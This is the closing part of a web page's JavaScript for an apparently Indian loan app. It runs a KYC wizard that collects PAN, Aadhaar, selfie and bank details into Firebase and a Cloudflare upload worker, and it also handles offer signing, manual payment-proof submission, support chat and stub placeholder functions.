            ['view-verification','view-calculator','view-pending','view-offer','view-disbursement','view-active', 'view-blocked'].forEach(id => {
                document.getElementById(id).classList.add('field-hidden');
            });
            document.getElementById('loan-wizard-header').classList.remove('field-hidden');

            const appSnap = await db.ref('users/'+currentUser.uid+'/loan_app').once('value');
            const app = appSnap.val() || {};
            
            const now = Date.now();
            if (userDataCache.loan_blocked_until && userDataCache.loan_blocked_until > now) {
                const blockedUntilDate = new Date(userDataCache.loan_blocked_until).toLocaleDateString();
                document.getElementById('block-end-date').innerText = blockedUntilDate;
                document.getElementById('loan-wizard-header').classList.add('field-hidden');
                showView('view-blocked');
                return;
            }
            
            if(app.status === 'active') {
                showView('view-active');
                loadActiveLoanData(app.loan_id); 
                document.getElementById('loan-wizard-header').classList.add('field-hidden'); 
                return;
            }
            
            if(app.status === 'accepted') { 
                showView('view-disbursement');
                loadDisbursementData(app.loan_id); 
                document.getElementById('loan-wizard-header').classList.add('field-hidden');
                return;
            }
            
            if(app.status === 'reviewed') {
                showView('view-offer');
                loadOfferData(app.loan_id);
                document.getElementById('loan-wizard-header').classList.add('field-hidden');
                return;
            }
            
            if(app.status === 'pending') {
                showView('view-pending');
                document.getElementById('pending-id').innerText = app.loan_id;
                document.getElementById('loan-wizard-header').classList.add('field-hidden');
                return;
            }
            
            if (['closed', 'rejected', 'rejected_by_user'].includes(app.status)) {
                const vSnap = await db.ref('users/'+currentUser.uid+'/loan_verification').once('value');
                const v = vSnap.val() || {};
                
                if(v.step5_completed) {
                    document.getElementById('loan-wizard-header').classList.add('field-hidden');
                    showView('view-calculator');
                    updateCalc();
                    
                    if (userDataCache.payment_on_time === true) {
                         document.getElementById('good-customer-msg').style.display = 'block';
                    }
                    
                } else {
                    document.querySelector('#view-pending h3').innerText = 'Loan Application Closed';
                    document.querySelector('#view-pending p').innerText = 'You can apply for a new loan once you complete all verification steps.';
                    showView('view-pending'); 
                }
                return;
            }

            const vSnap = await db.ref('users/'+currentUser.uid+'/loan_verification').once('value');
            const v = vSnap.val() || {};
            document.querySelectorAll('.step-item').forEach(el => el.classList.remove('completed', 'active'));

            let stepToShow = 1;

            if(v.step1_completed) { 
                document.querySelector('#step-1').classList.add('completed');
                stepToShow = 2;
                if(v.step1_data) {
                    document.getElementById('loan-fname').value = v.step1_data.fname || '';
                    document.getElementById('loan-dob').value = v.step1_data.dob || '';
                    document.getElementById('loan-email').value = v.step1_data.email || '';
                }
            }
            
            if(v.step2_completed) { 
                document.querySelector('#step-2').classList.add('completed');
                stepToShow = 3;
                if(v.step2_data) {
                    document.getElementById('loan-pan').value = v.step2_data.pan || '';
                    if(v.step2_data.selfie_url) {
                        const statusSpan = document.getElementById('selfie-file-status');
                        statusSpan.innerText = 'Selfie Uploaded!';
                        statusSpan.style.color = 'var(--success)';
                        document.getElementById('file-selfie-url').value = v.step2_data.selfie_url;
                    }
                }
            }

            if(v.step3_completed) { 
                document.querySelector('#step-3').classList.add('completed');
                stepToShow = 4;
                 if(v.step3_data) {
                    document.getElementById('loan-bank-name').value = v.step3_data.bank_name || '';
                    document.getElementById('loan-acc-num').value = v.step3_data.account_number || '';
                    document.getElementById('loan-ifsc').value = v.step3_data.ifsc_code || '';
                }
            }
            
            if(v.step4_completed) { 
                document.querySelector('#step-4').classList.add('completed');
                stepToShow = 5;
                if(v.step4_data) {
                    document.getElementById('loan-salary').value = v.step4_data.monthly_income || '';
                    document.getElementById('loan-occupation').value = v.step4_data.occupation || 'salaried';
                    document.getElementById('loan-company-name').value = v.step4_data.company_name || '';
                }
            }
            
            if(v.step5_completed) { 
                document.querySelector('#step-5').classList.add('completed');
                
                document.getElementById('loan-wizard-header').classList.add('field-hidden');
                showView('view-calculator');
                updateCalc();
                return;
            }
            
            const finalStep = targetStep > 0 ? targetStep : stepToShow;

            setStep(finalStep); 
            showView('view-verification');
        }
        
        async function acceptOffer() {
            if(!document.getElementById('agree-chk').checked) return alert("Accept T&C first");
            const sig = document.getElementById('signature').value;
            if(!sig) return alert("Digital Signature required (Type your full name)");

            const updates = {};
            updates['loan_requests/'+currentLoanId+'/status'] = 'accepted';
            updates['loan_requests/'+currentLoanId+'/signature'] = sig;
            updates['users/'+currentUser.uid+'/loan_app/status'] = 'accepted';
            updates['users/'+currentUser.uid+'/loan_app/accepted_at'] = Date.now();

            db.ref().update(updates).then(() => {
                alert("Loan Agreement Signed and Offer Accepted! Funds are now pending Admin review for disbursal.");
                checkLoanStep(); 
            });
        }
        
        // ------------------ FILE UPLOAD & STEP SAVE LOGIC (‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§î‡§∞ ‡§∏‡§π‡•Ä) ------------------

        async function uploadFile(fileInputId, inputIsBlob = false, blobData = null) {
            const fileInput = document.getElementById(fileInputId);
            let file = null;
            let fileName = '';

            if (inputIsBlob) {
                file = blobData;
                fileName = 'selfie_' + Date.now() + '.jpg';
            } else {
                file = fileInput.files[0];
            }

            if (!file || file.size === 0) return { url: null, error: "No file selected or file is empty." };
            
            let formData = new FormData();
            formData.append('file', file, fileName || file.name);

            const spanElement = inputIsBlob ? document.getElementById('selfie-file-status') : fileInput.parentNode.querySelector('span');
            const originalText = spanElement.dataset.originalText || spanElement.innerText;

            try {
                spanElement.innerText = 'Uploading...';
                spanElement.style.color = 'var(--warning)';

                const res = await fetch(CLOUDFLARE_WORKER_URL, {
                    method: 'POST',
                    body: formData,
                });

                if (!res.ok) {
                    const errorText = await res.text();
                    throw new Error(`Cloudflare Upload Failed: HTTP ${res.status} - ${errorText.substring(0, 100)}`);
                }
                
                const data = await res.json();
                
                if (data.publicURL) {
                    spanElement.innerText = inputIsBlob ? 'Selfie Uploaded!' : 'Uploaded!'; 
                    spanElement.style.color = 'var(--success)';
                    return { url: data.publicURL, error: null };
                } else {
                    throw new Error("Worker did not return a valid publicURL in response: " + JSON.stringify(data));
                }

            } catch(e) {
                console.error("Cloudflare Image upload failed:", e);
                spanElement.innerText = originalText; 
                spanElement.style.color = 'var(--danger)';
                return { url: "UPLOAD_FAILED_PLACEHOLDER", error: e.message }; 
            }
        }
        
        function handleUploadFail(btn, originalBtnText, msg) {
            btn.disabled = false;
            btn.innerText = originalBtnText;
            alert(msg);
        }

        async function saveStep(stepNum) {
            const uid = currentUser.uid;
            let data = {};
            let isComplete = false;
            let nextStep = stepNum + 1;

            const btn = document.querySelector(`#form-step-${stepNum} .btn`);
            const originalBtnText = btn.innerText;
            btn.disabled = true;
            btn.innerText = 'Saving... Please Wait';
            
            const fail = (msg) => {
                handleUploadFail(btn, originalBtnText, msg);
                return false; 
            }
            
            const success = () => {
                btn.disabled = false;
                btn.innerText = originalBtnText;
            }


            if(stepNum === 1) {
                const email = document.getElementById('loan-email').value;
                const dob = document.getElementById('loan-dob').value;
                const fname = document.getElementById('loan-fname').value;
                if(!email || !dob || !fname) { return fail("Step 1: Fill all fields."); }
                data = { email, dob, fname, saved_at: Date.now() };
                isComplete = true;
            }
            else if(stepNum === 2) {
                const panNum = document.getElementById('loan-pan').value.toUpperCase().trim();
                const aadhaarF_file = document.getElementById('file-aadhaar-f').files[0];
                const aadhaarB_file = document.getElementById('file-aadhaar-b').files[0];
                const panFile_file = document.getElementById('file-pan').files[0];
                const selfieUrl = document.getElementById('file-selfie-url').value; // Get the URL from the hidden field
                
                if(!panNum || panNum.length !== 10) { return fail("Step 2: Enter valid 10-digit PAN Number."); }
                if(!aadhaarF_file || !aadhaarB_file || !panFile_file) { return fail("Step 2: Upload all three documents (Aadhaar Front/Back, PAN File)."); }
                if(!selfieUrl) { return fail("Step 2: Mandatory Live Selfie is missing. Please capture one."); }
                
                // --- UPLOAD LOGIC (Selfie is already uploaded and URL is stored) ---
                btn.innerText = 'Uploading documents (1/3)...';
                const result1 = await uploadFile('file-aadhaar-f');
                if(result1.error) { return fail("Aadhaar Front upload failed: " + result1.error); }
                
                btn.innerText = 'Uploading documents (2/3)...';
                const result2 = await uploadFile('file-aadhaar-b');
                if(result2.error) { return fail("Aadhaar Back upload failed: " + result2.error); }

                btn.innerText = 'Uploading documents (3/3)...';
                const result3 = await uploadFile('file-pan');
                if(result3.error) { return fail("PAN File upload failed: " + result3.error); }
                // --- UPLOAD LOGIC END ---

                data = { 
                    pan: panNum, 
                    aadhaar_front_url: result1.url, 
                    aadhaar_back_url: result2.url, 
                    pan_img_url: result3.url, 
                    selfie_url: selfieUrl, // Include selfie URL
                    saved_at: Date.now() 
                };
                isComplete = true;
            }
            else if(stepNum === 3) {
                const bank = document.getElementById('loan-bank-name').value;
                const acc = document.getElementById('loan-acc-num').value;
                const ifsc = document.getElementById('loan-ifsc').value;
                const passbookFile = document.getElementById('file-passbook').files[0];
                
                if(!bank || !acc || !ifsc) { return fail("Step 3: Fill all bank details."); }
                if(!passbookFile) { return fail("Step 3: Uploading Passbook/Cheque is mandatory."); } // MANDATORY
                
                // --- UPLOAD LOGIC ---
                btn.innerText = 'Uploading document...';
                const result = await uploadFile('file-passbook');
                if(result.error) { return fail("Passbook/Cheque upload failed: " + result.error); }
                // --- UPLOAD LOGIC END ---

                data = { bank_name: bank, account_number: acc, ifsc_code: ifsc, passbook_url: result.url, saved_at: Date.now() };
                isComplete = true;
            }
            else if(stepNum === 4) {
                const salary = document.getElementById('loan-salary').value;
                const occ = document.getElementById('loan-occupation').value;
                const companyName = document.getElementById('loan-company-name').value;
                const salaryFile = document.getElementById('file-salary').files[0];
                const fileIsOptional = (occ === 'business' || occ === 'student'); 
                
                if(!salary || !occ) { return fail("Step 4: Enter occupation and monthly income."); }
                
                let salarySlipUrl = null;
                if(salaryFile) {
                    btn.innerText = 'Uploading document...';
                    const result = await uploadFile('file-salary');
                    if(result.error) { return fail("Salary Slip upload failed: " + result.error); }
                    salarySlipUrl = result.url;
                } else if (!fileIsOptional) {
                    alert("Warning: For salaried employees, uploading the Salary Slip is highly recommended for faster approval.");
                }

                data = { monthly_income: salary, occupation: occ, company_name: companyName, salary_slip_url: salarySlipUrl, saved_at: Date.now() };
                isComplete = true;
            }
            else if(stepNum === 5) {
                const addr = document.getElementById('loan-addr-perm').value;
                const curr = document.getElementById('loan-addr-curr').value;
                if(!addr || !curr) { return fail("Step 5: Enter both permanent and current addresses."); }
                
                data = { permanent_address: addr, current_address: curr, saved_at: Date.now() };
                isComplete = true;
                nextStep = 0; // Moves to calculator view
            }

            if(isComplete) {
                try {
                    await db.ref(`users/${uid}/loan_verification/step${stepNum}_data`).set(data);
                    await db.ref(`users/${uid}/loan_verification/step${stepNum}_completed`).set(true);
                    success();
                    checkLoanStep(nextStep); 
                } catch (error) {
                    fail("Error saving data to Firebase: " + error.message);
                }
            }
        }
        
        // [All other existing functions like updateCalc, submitLoanApplication, etc. are assumed to be present here or can be copied from your original code]
        
        // ------------------ NEW MANUAL PAYMENT PROOF LOGIC ------------------

        async function submitManualPaymentProof() {
            if(isGuest) return alert("Please Login/Sign Up to submit payment proof.");

            const utr = document.getElementById('manual-pay-utr').value.trim();
            const screenshotFile = document.getElementById('file-payscreen').files[0];
            const btn = document.getElementById('manual-pay-btn');
            const statusMsg = document.getElementById('manual-submission-message');
            const originalBtnText = btn.innerText;

            if (!utr || utr.length !== 12) {
                return alert("‡§ï‡•É‡§™‡§Ø‡§æ 12 ‡§Ö‡§Ç‡§ï‡•ã‡§Ç ‡§ï‡§æ UTR / ‡§∞‡•á‡§´‡§∞‡•á‡§Ç‡§∏ ‡§®‡§Ç‡§¨‡§∞ ‡§¶‡§∞‡•ç‡§ú ‡§ï‡§∞‡•á‡§Ç‡•§");
            }
            if (!screenshotFile) {
                return alert("‡§ï‡•É‡§™‡§Ø‡§æ ‡§≠‡•Å‡§ó‡§§‡§æ‡§® ‡§ï‡§æ ‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§®‡§∂‡•â‡§ü ‡§Ö‡§™‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç‡•§");
            }

            btn.disabled = true;
            btn.innerText = 'Uploading...';
            statusMsg.classList.add('field-hidden');

            const uploadResult = await uploadFile('file-payscreen');

            if (uploadResult.error) {
                btn.disabled = false;
                btn.innerText = originalBtnText;
                return alert("‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§®‡§∂‡•â‡§ü ‡§Ö‡§™‡§≤‡•ã‡§° ‡§µ‡§ø‡§´‡§≤ ‡§∞‡§π‡§æ: " + uploadResult.error);
            }

            const newSubmissionId = 'MANUAL_' + Date.now();
            
            const payload = {
                id: newSubmissionId,
                userId: currentUser.uid,             
                utr: utr,                          
                screenshotUrl: uploadResult.url,   
                timestamp: Date.now(),
                status: 'pending_admin_review'     
            };

            try {
                btn.innerText = 'Saving Data...';
                await db.ref('manual_payment_submissions/' + newSubmissionId).set(payload);

                statusMsg.style.color = 'var(--success)';
                statusMsg.innerHTML = '<i class="ri-check-line"></i> Submission Successful. We will review your payment shortly.';
                statusMsg.classList.remove('field-hidden');

                document.getElementById('manual-pay-utr').value = '';
                document.getElementById('file-payscreen').value = '';
                const fileSpan = document.getElementById('manual-file-status');
                fileSpan.innerText = fileSpan.dataset.originalText || 'Upload Payment Screenshot (JPG/PNG)';
                fileSpan.style.color = '';

            } catch (error) {
                statusMsg.style.color = 'var(--danger)';
                console.error("Firebase Submission Error:", error); 
                statusMsg.innerHTML = '<i class="ri-error-warning-line"></i> Error saving submission: ' + error.message;
                statusMsg.classList.remove('field-hidden');
            } finally {
                btn.disabled = false;
                btn.innerText = originalBtnText;
            }
        }
// ------------------ END NEW MANUAL PAYMENT PROOF LOGIC ------------------

// ------------------ NEW CHAT SUPPORT LOGIC ------------------

        let isChatListening = false;
        
        function openSupportChat() {
            if (isGuest) return alert("Please Login/Sign Up to access Support Chat.");
            document.getElementById('support-chat-modal').style.display = 'flex';
            if (!isChatListening) {
                listenForChatMessages();
            }
            const chatBox = document.getElementById('chat-messages');
            chatBox.scrollTop = chatBox.scrollHeight;
        }

        function listenForChatMessages() {
            isChatListening = true;
            const chatBox = document.getElementById('chat-messages');
            
            db.ref('loan_support_chat/' + currentUser.uid).limitToLast(100).on('child_added', snap => {
                const message = snap.val();
                if (!message) return;
                
                const isUser = message.sender === 'user';
                const div = document.createElement('div');
                div.className = 'msg-bubble ' + (isUser ? 'msg-user' : 'msg-admin');
                div.innerText = message.text;
                
                const timeSpan = document.createElement('span');
                timeSpan.className = 'msg-time';
                timeSpan.innerText = `${isUser ? 'You' : 'Admin'} - ${new Date(message.timestamp).toLocaleTimeString()}`;
                
                div.appendChild(timeSpan);
                chatBox.appendChild(div);
                
                chatBox.scrollTop = chatBox.scrollHeight;
            });
        }

        function sendChatMessage() {
            const input = document.getElementById('chat-message-input');
            const text = input.value.trim();
            if (!text) return;

            const messagePayload = {
                text: text,
                sender: 'user', 
                timestamp: Date.now(),
                user_id: currentUser.uid 
            };

            db.ref('loan_support_chat/' + currentUser.uid).push(messagePayload)
                .then(() => {
                    input.value = ''; 
                })
                .catch(error => {
                    alert("Failed to send message: " + error.message);
                });
        }

// ------------------ END NEW CHAT SUPPORT LOGIC ------------------
        
        // --- Dummy/Placeholder functions for completeness ---
        function toggleTheme() {
            const body = document.body;
            const newTheme = body.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
            body.setAttribute('data-theme', newTheme);
            body.classList.toggle('dark-mode', newTheme === 'dark');
        }
        function updateCalc() {
             const amt = parseInt(document.getElementById('calc-amt').value);
             const tenure = parseInt(document.getElementById('calc-tenure').value);
             const emi = Math.round(amt / tenure);
             document.getElementById('calc-amt-display').innerText = amt.toLocaleString();
             document.getElementById('calc-tenure-display').innerText = tenure;
             document.getElementById('calc-emi-display').innerText = `‚Çπ${emi.toLocaleString()}`;
             document.getElementById('calc-total-display').innerText = `‚Çπ${(emi * tenure).toLocaleString()}`;
        }
        function submitLoanApplication() { alert("Loan Submitted"); }
        function loadActiveLoanData(loanId) { 
             document.getElementById('track-balance').innerText = '10,000';
             document.getElementById('track-next-date').innerText = '25/12/2025';
             document.getElementById('track-next-amt').innerText = '1,667';
             document.getElementById('track-timer').innerText = '12d 05h';
        }
        function loadDisbursementData(loanId) { document.getElementById('disburse-amt').innerText = '9,500'; }
        function loadOfferData(loanId) { 
            document.getElementById('offer-amt').innerText = '10,000';
            document.getElementById('offer-tenure').innerText = '6';
            document.getElementById('offer-roi').innerText = '0';
            document.getElementById('offer-fee').innerText = '500';
            document.getElementById('offer-total').innerText = '10,000';
        }
        function listenForLoanStatus() {}
        function loadClosedLoanHistory() {}
        function rejectOffer() { alert("Offer Rejected"); }
        function openPayModal() { alert("Pay Modal Open"); }
        function launchUPI() { alert("Launching UPI App"); }
        function submitPayment() { alert("Payment Submitted"); }
        function requestForeclosure() { alert("Foreclosure Requested"); }
        // --- End Dummy/Placeholder functions ---
        

    </script>
</body>
</html>

